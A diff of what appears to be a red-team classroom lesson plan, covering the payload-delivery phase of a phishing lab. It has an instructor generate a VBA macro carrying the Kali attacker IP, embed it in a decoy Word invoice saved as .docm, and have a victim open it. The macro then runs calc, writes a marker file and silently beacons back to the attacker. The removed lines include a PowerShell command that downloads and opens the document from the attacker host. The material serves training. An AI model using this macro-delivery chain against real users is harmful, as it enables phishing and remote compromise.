@@ -352,59 +352,43 @@ Show students side-by-side: real site vs cloned — they look identical.
 
 ## Phase 6 — Payload Delivery
 
-### Step 1 — Generate the macro (Kali, Terminal 4)
+**Where the Kali IP enters the picture:** when you ran `source config.sh` at the start of the session, `$KALI_IP` was set. The next command bakes it into the VBA automatically.
+
+### On Kali — generate the files (Terminal 4)
 
 ```bash
 python3 tools/create_macro_doc.py
-# Creates: payloads/invoice_Q4_2024.docx   (decoy document)
-#          payloads/macro_code.vba          (VBA with your Kali IP baked in)
 ```
 
-Review what the macro does with students:
-```bash
-cat payloads/macro_code.vba
-```
-Three things happen the moment the victim clicks "Enable Content":
-1. `calc.exe` opens — proof the macro ran
-2. `macro_ran.txt` is written to `%TEMP%` — artifact on disk
-3. A PowerShell one-liner silently beacons back to Kali
+This creates two files in `payloads/`:
+- `macro_code.vba` — the VBA macro with your Kali IP already inside
+- `invoice_Q4_2024.docx` — the decoy Word document
 
-### Step 2 — Embed the macro (Windows attacker machine)
+### On Windows (attacker) — embed the macro
 
-Download both files from Kali in your browser:
+Open a browser and download both files from Kali:
 ```
 http://<Kali IP>:8080/payloads/invoice_Q4_2024.docx
 http://<Kali IP>:8080/payloads/macro_code.vba
 ```
 
-Open `invoice_Q4_2024.docx` in **Microsoft Word**, then:
-1. `Alt + F11` — opens the VBA editor
-2. In the left panel: right-click the document → **Insert → Module**
-3. Paste the full content of `macro_code.vba` into the module
+Open `invoice_Q4_2024.docx` in Word:
+1. Press `Alt + F11` to open the VBA editor
+2. Right-click the document name in the left panel → **Insert → Module**
+3. Open `macro_code.vba` in Notepad, copy everything, paste it into the module
 4. Close the VBA editor
-5. **File → Save As** → choose type **Word Macro-Enabled Document (*.docm)** → save as `invoice_Q4_2024.docm`
+5. **File → Save As** → set file type to **Word Macro-Enabled Document (\*.docm)** → save as `invoice_Q4_2024.docm`
 
-### Step 3 — Upload the .docm to Kali
+The `.docm` is ready. Drag and drop it wherever you want — or just open it directly on the same machine.
 
-From Windows PowerShell (OpenSSH is built-in on Windows 10/11):
-```powershell
-scp invoice_Q4_2024.docm kali@<Kali IP>:~/red4blue/lesson1/payloads/
-```
+### On Windows (victim) — open the document
 
-http_server.py is already serving the `payloads/` folder — the file is immediately available.
+Double-click `invoice_Q4_2024.docm` and click **Enable Content** when Word prompts.
 
-### Step 4 — Victim opens the document (Windows)
-
-```powershell
-Invoke-WebRequest -Uri "http://<Kali IP>:8080/payloads/invoice_Q4_2024.docm" `
-                  -OutFile "$env:TEMP\invoice_Q4_2024.docm"
-Invoke-Item "$env:TEMP\invoice_Q4_2024.docm"
-```
-
-1. Word opens — click **Enable Content** when prompted
-2. Calculator opens — macro executed
-3. A confirmation dialog appears
-4. The macro silently beacons back to Kali in the background
+What happens automatically:
+- Calculator opens — the macro ran
+- `%TEMP%\macro_ran.txt` is written to disk
+- A PowerShell command silently beacons back to Kali
 
 ---
 
